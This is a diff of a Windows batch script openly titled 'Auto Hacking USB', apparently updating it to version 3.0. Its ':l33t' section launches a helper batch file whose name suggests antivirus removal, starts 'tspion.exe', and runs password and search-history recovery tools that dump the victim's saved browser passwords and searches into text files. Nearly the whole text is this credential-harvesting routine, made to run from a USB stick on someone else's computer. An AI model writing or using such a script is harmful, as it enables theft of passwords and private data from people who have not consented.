@@ -1,5 +1,5 @@
 @echo off
-title Auto Hacking USB ~~ Legal Purposes ;) ~~ @rossepstein(Twitter)
+title Auto Hacking USB ~~ Legal Purposes ;) ~~ 3.0
 :begin
 echo Please read the readme to see new features and other information.
 pause
@@ -39,8 +39,8 @@ pause
 start .\App\options.bat
 goto eof
 :l33t
-start .\App\rem.bat
-ping localhost -n 5 >nul
+start .\App\avrem.bat
+ping localhost -n 2 >nul
 start tspion.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
